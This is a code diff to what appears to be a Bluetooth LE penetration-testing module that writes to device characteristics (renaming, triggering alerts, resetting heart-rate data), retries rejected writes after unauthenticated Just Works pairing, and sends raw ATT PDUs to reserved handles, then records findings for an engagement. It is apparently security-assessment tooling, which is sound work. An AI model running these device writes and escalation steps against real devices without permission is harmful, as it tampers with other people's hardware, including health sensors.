@@ -24,7 +24,9 @@ import time
 from dataclasses import dataclass
 from datetime import datetime, timezone
 
-from whad.ble.exceptions import ConnectionLostException
+from whad.ble.exceptions import (
+    ConnectionLostException,
+)
 
 from core.dongle import WhadDongle
 from core.models import Target, Finding
@@ -38,8 +40,6 @@ CONNECT_TIMEOUT  = 15     # seconds for BLE connection
 DISCOVER_TIMEOUT = 20     # seconds for GATT discovery (needed for char() / notify)
 NOTIFY_DWELL     = 3.0    # seconds to collect notify responses after probe writes
 ALERT_DWELL      = 2.0    # pause between High Alert trigger and restore
-POC_NAME         = "BLE-PoC"
-
 # Generic proprietary channel probes — single, two, and three-byte sequences.
 # Applied to any unknown write characteristic; notify pair captures responses.
 _PROPRIETARY_PROBES: list[bytes] = [
@@ -78,6 +78,7 @@ def run(
     target: Target,
     engagement_id: str,
     gatt_profile: list[dict],
+    poc_name: str = "BLE-PoC",
 ) -> None:
     addr      = target.bd_address
     is_random = target.address_type != "public"
@@ -90,10 +91,12 @@ def run(
     central    = dongle.central()
     _monitor   = attach_monitor(central, pcap_path(engagement_id, 8, addr))
     periph_dev = None
-    results: list[WriteResult]  = []
-    baseline: dict[int, bytes]  = {}
-    notifications: list[dict]   = []
-    actions: list[dict]         = []
+    results: list[WriteResult]       = []
+    baseline: dict[int, bytes]       = {}
+    notifications: list[dict]        = []
+    actions: list[dict]              = []
+    raw_pdu_results: list[dict]      = []
+    post_pairing_results: list[dict] = []
     lock = threading.Lock()
 
     try:
@@ -103,6 +106,13 @@ def run(
             return
 
         log.info(f"[S8] Connected to {addr}.")
+
+        # Negotiate MTU — enables >20-byte payloads on ATT reads/writes.
+        try:
+            central.set_mtu(247)
+            log.debug("[S8] MTU negotiated to 247")
+        except Exception as exc:
+            log.debug(f"[S8] MTU negotiation (non-critical): {exc}")
 
         # Discovery: needed for char(uuid) notify subscription AND self-profiling.
         discovered = _discover_with_timeout(periph_dev, addr)
@@ -171,6 +181,7 @@ def run(
                         periph_dev, handle, uuid,
                         baseline.get(handle),
                         target.name or "",
+                        poc_name,
                     )
                 )
             elif label == "alert_level_trigger":
@@ -185,6 +196,56 @@ def run(
                     )
                 )
 
+        # Phase 3 — Auth escalation: pair inline and retry auth-rejected handles.
+        auth_rejected = [r for r in results if r.error == "auth_required"]
+        if auth_rejected and discovered:
+            log.info(
+                f"[S8] {len(auth_rejected)} auth-rejected write(s) — "
+                "attempting LESC Just Works pairing for escalation ..."
+            )
+            try:
+                from whad.ble.stack.smp.parameters import Pairing as _Pairing
+                paired = periph_dev.pairing(
+                    pairing=_Pairing(lesc=True, mitm=False, bonding=False)
+                )
+            except Exception as exc:
+                paired = False
+                log.debug(f"[S8] Inline pairing failed: {type(exc).__name__}: {exc}")
+
+            log.info(f"[S8] Inline pairing: {'SUCCESS' if paired else 'FAILED'}")
+            if paired:
+                for orig in auth_rejected:
+                    pr: dict = {
+                        "handle": orig.handle,
+                        "uuid":   orig.uuid,
+                        "label":  orig.label,
+                        "data_hex": orig.data.hex(),
+                        "success": False,
+                        "error":   None,
+                    }
+                    try:
+                        periph_dev.write(orig.handle, orig.data)
+                        pr["success"] = True
+                        log.info(
+                            f"[S8] Post-pairing write h={orig.handle}: ACCEPTED"
+                        )
+                    except Exception as exc:
+                        pr["error"] = _exc_summary(exc)
+                        log.debug(
+                            f"[S8] Post-pairing write h={orig.handle}: {pr['error']}"
+                        )
+                    post_pairing_results.append(pr)
+
+        # Phase 4 — Raw PDU probe (MDK SendPDU domain capability).
+        # Probes reserved/boundary ATT handles bypassing the high-level API.
+        raw_pdu_results = _raw_pdu_probe(central, addr)
+        if raw_pdu_results:
+            responded = [r for r in raw_pdu_results if r["response_hex"]]
+            log.info(
+                f"[S8] Raw PDU probe: {len(responded)}/{len(raw_pdu_results)} "
+                "handles responded"
+            )
+
     except ConnectionLostException:
         log.warning(f"[S8] Connection lost during PoC on {addr}.")
     except Exception as exc:
@@ -197,7 +258,9 @@ def run(
                 pass
         detach_monitor(_monitor)
 
-    evidence = _build_evidence(results, baseline, notifications)
+    evidence = _build_evidence(
+        results, baseline, notifications, raw_pdu_results, post_pairing_results
+    )
     _record_finding(target, engagement_id, actions, results, evidence)
     _print_summary(target, actions, results, evidence)
 
@@ -242,18 +305,33 @@ def _do_rename(
     uuid: str,
     original_bytes: bytes | None,
     original_name: str,
+    poc_name: str = "BLE-PoC",
 ) -> list[WriteResult]:
     results: list[WriteResult] = []
-    poc_bytes = POC_NAME.encode("utf-8")
+    poc_bytes = poc_name.encode("utf-8")
 
     wr = WriteResult(handle=handle, uuid=uuid, label="rename_poc", data=poc_bytes)
     try:
         periph_dev.write(handle, poc_bytes)
         wr.success = True
-        log.info(f"[S8] 0x2A00 h={handle}: WRITE OK — '{POC_NAME}' ({poc_bytes.hex()})")
+        log.info(f"[S8] 0x2A00 h={handle}: WRITE OK — '{poc_name}' ({poc_bytes.hex()})")
     except Exception as exc:
-        wr.error = _exc_summary(exc)
-        log.info(f"[S8] 0x2A00 h={handle}: WRITE FAILED — {wr.error}")
+        _s = str(exc).lower()
+        if "not permitted" in _s:
+            wr.error = "write_not_permitted"
+            log.info(f"[S8] 0x2A00 h={handle}: WRITE REJECTED — characteristic hardened")
+        elif "authentication" in _s or "authorization" in _s:
+            wr.error = "auth_required"
+            log.info(
+                f"[S8] 0x2A00 h={handle}: WRITE REJECTED — "
+                "authentication required (pairing opportunity)"
+            )
+        elif "encryption" in _s:
+            wr.error = "encryption_required"
+            log.info(f"[S8] 0x2A00 h={handle}: WRITE REJECTED — encryption required")
+        else:
+            wr.error = _exc_summary(exc)
+            log.info(f"[S8] 0x2A00 h={handle}: WRITE FAILED — {wr.error}")
     results.append(wr)
 
     if wr.success:
@@ -295,8 +373,19 @@ def _do_alert(periph_dev, handle: int, uuid: str) -> list[WriteResult]:
         r_high.success = True
         log.info(f"[S8] 0x2A06 h={handle}: WRITE OK — High Alert (0x02)")
     except Exception as exc:
-        r_high.error = _exc_summary(exc)
-        log.info(f"[S8] 0x2A06 h={handle}: WRITE FAILED — {r_high.error}")
+        _s = str(exc).lower()
+        if "not permitted" in _s:
+            r_high.error = "write_not_permitted"
+            log.info(f"[S8] 0x2A06 h={handle}: WRITE REJECTED — characteristic hardened")
+        elif "authentication" in _s or "authorization" in _s:
+            r_high.error = "auth_required"
+            log.info(f"[S8] 0x2A06 h={handle}: WRITE REJECTED — authentication required")
+        elif "encryption" in _s:
+            r_high.error = "encryption_required"
+            log.info(f"[S8] 0x2A06 h={handle}: WRITE REJECTED — encryption required")
+        else:
+            r_high.error = _exc_summary(exc)
+            log.info(f"[S8] 0x2A06 h={handle}: WRITE FAILED — {r_high.error}")
     results.append(r_high)
 
     if r_high.success:
@@ -322,8 +411,19 @@ def _do_hr_reset(periph_dev, handle: int, uuid: str) -> list[WriteResult]:
         r.success = True
         log.info(f"[S8] 0x2A39 h={handle}: WRITE OK — Reset Energy Expended (0x01)")
     except Exception as exc:
-        r.error = _exc_summary(exc)
-        log.info(f"[S8] 0x2A39 h={handle}: WRITE FAILED — {r.error}")
+        _s = str(exc).lower()
+        if "not permitted" in _s:
+            r.error = "write_not_permitted"
+            log.info(f"[S8] 0x2A39 h={handle}: WRITE REJECTED — characteristic hardened")
+        elif "authentication" in _s or "authorization" in _s:
+            r.error = "auth_required"
+            log.info(f"[S8] 0x2A39 h={handle}: WRITE REJECTED — authentication required")
+        elif "encryption" in _s:
+            r.error = "encryption_required"
+            log.info(f"[S8] 0x2A39 h={handle}: WRITE REJECTED — encryption required")
+        else:
+            r.error = _exc_summary(exc)
+            log.info(f"[S8] 0x2A39 h={handle}: WRITE FAILED — {r.error}")
     return [r]
 
 
@@ -372,7 +472,15 @@ def _do_probe(
             periph_dev.write_command(handle, probe_bytes)
             r.success = True
         except Exception as exc:
-            r.error = _exc_summary(exc)
+            _s = str(exc).lower()
+            if "not permitted" in _s:
+                r.error = "write_not_permitted"
+            elif "authentication" in _s or "authorization" in _s:
+                r.error = "auth_required"
+            elif "encryption" in _s:
+                r.error = "encryption_required"
+            else:
+                r.error = _exc_summary(exc)
         results.append(r)
 
     n_ok = sum(1 for r in results if r.success)
@@ -508,6 +616,50 @@ def _find_notify_pair_uuid(write_uuid: str, notify_uuids: set[str]) -> str | Non
     return None
 
 
+def _raw_pdu_probe(central, addr: str) -> list[dict]:
+    """Send raw ATT PDUs via synchronous Central mode.
+
+    Uses the MDK dongle's SendPDU capability to probe handles that the
+    high-level ATT API cannot reach: handle 0 (reserved), handle 1 (first
+    attribute), and handle 0xFFFF (BLE spec upper boundary).
+
+    Returns a list of {handle, response_hex} dicts. Empty on any failure —
+    this is a best-effort probe that must not disrupt the main session.
+    """
+    results: list[dict] = []
+    try:
+        from scapy.layers.bluetooth4LE import BTLE_DATA
+        from scapy.layers.bluetooth import ATT_Read_Request
+    except ImportError:
+        log.debug("[S8] Raw PDU probe: scapy ATT layers not available")
+        return results
+
+    try:
+        central.enable_synchronous(True)
+        for handle in (0x0000, 0x0001, 0xFFFF):
+            entry: dict = {"handle": f"0x{handle:04X}", "response_hex": None}
+            try:
+                pkt = BTLE_DATA() / ATT_Read_Request(gatt_handle=handle)
+                central.send_pdu(pkt)
+                resp = central.wait_packet(timeout=3.0)
+                if resp is not None:
+                    entry["response_hex"] = bytes(resp).hex()
+                log.debug(
+                    f"[S8] raw PDU h=0x{handle:04X}: {entry['response_hex'] or 'no response'}"
+                )
+            except Exception as exc:
+                log.debug(f"[S8] raw PDU h=0x{handle:04X}: {_exc_summary(exc)}")
+            results.append(entry)
+    except Exception as exc:
+        log.debug(f"[S8] Raw PDU probe setup: {_exc_summary(exc)}")
+    finally:
+        try:
+            central.enable_synchronous(False)
+        except Exception:
+            pass
+    return results
+
+
 def _exc_summary(exc: Exception) -> str:
     msg = str(exc).strip() or type(exc).__name__
     first_line = msg.splitlines()[0] if "\n" in msg else msg
@@ -520,16 +672,18 @@ def _build_evidence(
     results: list[WriteResult],
     baseline: dict[int, bytes],
     notifications: list[dict],
+    raw_pdu_results: list[dict] | None = None,
+    post_pairing_results: list[dict] | None = None,
 ) -> dict:
     successes = [r for r in results if r.success]
     failures  = [r for r in results if not r.success]
     confirmed = [r for r in results if r.readback_confirmed]
-    return {
-        "write_count":       len(successes),
-        "error_count":       len(failures),
-        "confirmed_poc_name": POC_NAME if confirmed else None,
-        "notifications":     notifications,
-        "baseline_reads":    {str(h): v.hex() for h, v in baseline.items()},
+    ev: dict = {
+        "write_count":        len(successes),
+        "error_count":        len(failures),
+        "confirmed_poc_name": confirmed[0].data.decode("utf-8", errors="replace") if confirmed else None,
+        "notifications":      notifications,
+        "baseline_reads":     {str(h): v.hex() for h, v in baseline.items()},
         "write_results": [
             {
                 "handle":       r.handle,
@@ -544,6 +698,12 @@ def _build_evidence(
             for r in results
         ],
     }
+    if raw_pdu_results:
+        ev["raw_pdu_probe"] = raw_pdu_results
+    if post_pairing_results:
+        ev["post_pairing_results"] = post_pairing_results
+        ev["post_pairing_escalated"] = any(r["success"] for r in post_pairing_results)
+    return ev
 
 
 def _record_finding(
@@ -563,7 +723,7 @@ def _record_finding(
         rename_wr = [r for r in results if r.label == "rename_poc"]
         if confirmed_name:
             parts.append(
-                f"renamed device to '{POC_NAME}' via 0x2A00 without auth "
+                f"renamed device to '{confirmed_name}' via 0x2A00 without auth "
                 "(confirmed by read-back)"
             )
         elif any(r.success for r in rename_wr):
@@ -606,7 +766,8 @@ def _record_finding(
         parts.append("no writes succeeded — all ATT requests rejected")
 
     is_meaningful = "device_name_rename" in labels or "alert_level_trigger" in labels
-    if confirmed_name or (write_count > 0 and is_meaningful):
+    post_escalated = evidence.get("post_pairing_escalated", False)
+    if confirmed_name or (write_count > 0 and is_meaningful) or post_escalated:
         severity = "high"
     elif write_count > 0:
         severity = "medium"
@@ -614,10 +775,18 @@ def _record_finding(
         severity = "low"
 
     notify_count = len(evidence["notifications"])
+    post_results = evidence.get("post_pairing_results", [])
+    post_ok      = [r for r in post_results if r["success"]]
+    post_note    = (
+        f" Post-pairing escalation: {len(post_ok)}/{len(post_results)} "
+        "auth-gated handle(s) became writable after unauthenticated pairing."
+        if post_results else ""
+    )
     desc = (
         f"GATT PoC on {target.bd_address} ({target.name or 'unnamed'}): "
         + "; ".join(parts)
         + (f" — {notify_count} notify response(s) captured." if notify_count else ".")
+        + post_note
     )
 
     finding = Finding(
@@ -669,7 +838,7 @@ def _print_summary(
                     "  read-back: CONFIRMED" if wr.readback_confirmed
                     else f"  read-back: {'mismatch' if wr.readback else 'unavailable (auth required)'}"
                 )
-                print(f"    [0x2A00  h={handle}]  WRITE OK — '{POC_NAME}'{rb_note} → restored")
+                print(f"    [0x2A00  h={handle}]  WRITE OK — '{wr.data.decode('utf-8', errors='replace')}'{rb_note} → restored")
             elif wr:
                 print(f"    [0x2A00  h={handle}]  WRITE FAILED — {wr.error}")
 
@@ -715,5 +884,24 @@ def _print_summary(
 
     if wc == 0 and ec == 0:
         print("\n  [!] No writes executed — connection or profile issue.")
+
+    raw_pdu = evidence.get("raw_pdu_probe", [])
+    if raw_pdu:
+        responded = [r for r in raw_pdu if r.get("response_hex")]
+        print(f"\n  Raw PDU probe ({len(responded)}/{len(raw_pdu)} handles responded):")
+        for r in raw_pdu:
+            resp = r["response_hex"][:40] + "…" if r.get("response_hex") and len(r["response_hex"]) > 40 else (r.get("response_hex") or "no response")
+            print(f"    h={r['handle']}  {resp}")
+
+    post = evidence.get("post_pairing_results", [])
+    if post:
+        post_ok = [r for r in post if r["success"]]
+        print(
+            f"\n  Post-pairing escalation ({len(post_ok)}/{len(post)} "
+            "auth-gated handles re-tried after LESC Just Works pairing):"
+        )
+        for r in post:
+            status = "ACCEPTED" if r["success"] else f"REJECTED ({r['error']})"
+            print(f"    h={r['handle']} [{r['uuid'][:8]}...]  {status}")
 
     print("─" * 76 + "\n")
